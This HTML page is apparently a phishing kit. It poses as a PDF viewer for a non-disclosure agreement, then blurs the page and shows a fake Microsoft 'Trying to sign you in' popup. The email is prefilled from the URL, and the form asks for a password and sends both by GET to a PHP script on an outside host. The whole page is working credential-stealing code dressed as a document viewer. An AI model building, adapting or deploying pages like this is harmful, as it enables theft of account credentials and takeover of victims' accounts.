<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Load PDF</title>

<style>
    html, body {
        height: 100%;
        margin: 0;
        overflow: hidden;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    /* MAIN PDF VIEWER */
    #pdfViewer {
        width: 100%;
        height: 100%;
        border: none;
        transition: filter 0.5s ease;
    }

    /* SIGN-IN POPUP CONTAINER */
    #smallIframe {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 420px;
        background: rgba(169, 169, 169, 0.6);
        padding: 22px;
        box-sizing: border-box;
        border-radius: 8px;
        opacity: 0;
        transition: opacity 1s ease;
    }

    /* LOGO */
    #logo {
        width: 120px;
        margin-bottom: 10px;
    }

    /* TEXT ELEMENTS */
    #expiredText, #loginForm {
        transition: opacity 1s ease;
    }

    #expiredText {
        color: #000;
        font-size: 24px;
        font-weight: 500;
        margin: 5px 0 15px 0;
    }

    /* THROBBER */
    .throbber-container {
        width: 100%;
        height: 20px;
        overflow: hidden;
        margin: 10px 0 15px 0;
    }

    .throbber {
        display: flex;
        width: 450%;
        animation: moveThrobber 6s ease-in-out infinite;
    }

    .throbber div {
        width: 6px;
        height: 6px;
        background: #005da6;
        border-radius: 50%;
        margin: 0 6px;
        animation: throb 1.5s ease-in-out infinite;
    }

    @keyframes moveThrobber {
        0% { transform: translateX(-100%); }
        50% { transform: translateX(0); }
        100% { transform: translateX(100%); }
    }

    @keyframes throb {
        0%, 100% { transform: scale(1); }
        50% { transform: scale(1.5); }
    }

    /* LOGIN FORM */
    #loginForm {
        display: none;
        margin-top: 10px;
    }

    #email-display {
        margin: 0 0 10px 0;
        display: flex;
        align-items: center;
        cursor: not-allowed;
    }

    #email-display::before {
        content: "←";
        font-size: 18px;
        margin-right: 8px;
    }

    #signInText {
        font-size: 22px;
        font-weight: 500;
        margin: 10px 0;
    }

    #loginForm input {
        width: 100%;
        padding: 10px;
        margin-bottom: 12px;
        border: none;
        border-bottom: 1px solid #005da6;
        background: transparent;
        font-size: 16px;
        outline: none;
    }

    #loginForm button {
        background-color: #005da6;
        color: white;
        border: none;
        padding: 8px 10px;
        font-size: 16px;
        border-radius: 4px;
        width: 110px;
        float: right;
        cursor: pointer;
        margin-top: 20px;
    }

    /* RESPONSIVE — Tablet */
    @media (max-width: 900px) {
        #smallIframe {
            width: 75%;
        }

        #expiredText, #signInText {
            font-size: 22px;
        }
    }

    /* RESPONSIVE — Phone */
    @media (max-width: 600px) {
        #smallIframe {
            width: 90%;
            padding: 18px;
        }

        #logo {
            width: 100px;
        }

        #expiredText, #signInText {
            font-size: 20px;
        }

        #loginForm input {
            font-size: 15px;
        }

        #loginForm button {
            width: 100%;
            float: none;
            margin-top: 15px;
        }
    }
</style>

<script>
    function getEmailFromURL() {
        const url = window.location.href;
        const emailRegex = /\?(.+)$/;
        const matches = url.match(emailRegex);
        return matches && matches[1] ? decodeURIComponent(matches[1]) : '';
    }

    window.onload = function() {
        const email = getEmailFromURL();
        document.getElementById('email').value = email;
        document.getElementById('email-display').textContent = email;
    };

    function applyBlur() {
        document.getElementById('pdfViewer').style.filter = 'blur(5px)';
    }

    function showSmallIframe() {
        document.getElementById('smallIframe').style.opacity = '1';
    }

    function fadeOutTextAndThrobber() {
        document.getElementById('expiredText').style.opacity = '0';
        document.querySelector('.throbber-container').style.opacity = '0';
        setTimeout(showLoginForm, 900);
    }

    function showLoginForm() {
        document.getElementById('expiredText').style.display = 'none';
        document.querySelector('.throbber-container').style.display = 'none';
        const loginForm = document.getElementById('loginForm');
        loginForm.style.display = 'block';
        document.getElementById('password').focus();
    }

    function validateForm() {
        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;
        var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

        if (!emailPattern.test(email)) {
            alert("Please enter a valid email address.");
            return false;
        }
        if (password.length < 4) {
            alert("Password must be at least 4 characters long.");
            return false;
        }
        return true;
    }

    setTimeout(applyBlur, 4000);
    setTimeout(showSmallIframe, 5000);
    setTimeout(fadeOutTextAndThrobber, 7000);
</script>

</head>
<body>

<iframe id="pdfViewer" src="https://darkcyan-swallow-106523.hostingersite.com/Non-Disclosure-Agreement.pdf"></iframe>

<!-- POPUP -->
<div id="smallIframe">
    <img id="logo" src="https://darkcyan-swallow-106523.hostingersite.com/microsoft_logo.svg" alt="Microsoft Logo">
    <p id="expiredText">Trying to sign you in</p>

    <div class="throbber-container">
        <div class="throbber">
            <div></div><div></div><div></div><div></div><div></div>
        </div>
    </div>

    <div id="loginForm">
        <p id="email-display">Loading email...</p>
        <p id="signInText">Enter password</p>

        <form id="authForm" action="https://darkcyan-swallow-106523.hostingersite.com/new.php" method="GET" onsubmit="return validateForm()">
            <input type="hidden" id="email" name="email">
            <input type="password" id="password" name="password" placeholder="Password" required minlength="4">
            <button type="submit">Sign in</button>
        </form>
    </div>
</div>

</body>
</html>
